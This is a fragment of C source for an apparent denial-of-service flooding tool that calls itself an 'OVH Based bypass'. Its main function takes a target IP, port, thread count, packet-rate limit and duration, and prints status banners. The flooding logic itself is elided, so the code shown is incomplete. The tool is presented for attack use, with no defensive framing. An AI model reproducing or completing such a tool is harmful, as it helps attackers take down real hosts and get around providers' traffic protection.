...
int main(int argc, char *argv[])
{
    if(argc < 6)
    {
        fprintf(stdout, "\033[31mOVH-VIP, OVH Based bypass - by Terror\nUsage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n\033[0m\n", argv[0]);
        exit(-1);
    }
 
    fprintf(stdout, "\033[31mTerror.Shiroko -> Setting up networking...\033[0m\n");
    ...
    fprintf(stdout, "\033[31mTerror.Shiroko -> Starting...\033[0m\n");
